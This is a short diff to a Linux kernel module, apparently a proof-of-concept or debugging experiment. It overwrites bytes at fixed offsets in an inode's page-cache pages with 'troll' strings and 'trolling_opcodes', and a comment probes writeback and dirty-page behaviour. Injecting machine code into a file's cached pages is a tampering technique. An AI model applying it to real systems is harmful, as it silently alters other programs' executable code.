@@ -52,11 +52,16 @@ int init_module(void)
   for(count = 0; count<7; count++,ptr++){ //doin a little trolling
     *ptr = *(troll+count);
   }
+  kunmap(map);
+
+  page = find_page_inode(i, 0x00107c14);
+  map = kmap(page);
   ptr = (char*)map + pg_off(0x00107c14);
   for(count = 0; count < 10; count++, ptr++){
     *ptr = trolling_opcodes[count];
   }
   kunmap(map);
+
   //SetPageDirty(page); //this fixes it thus proving that it is not a bug in the writeback daemon
 
   if(PageDirty(page)){
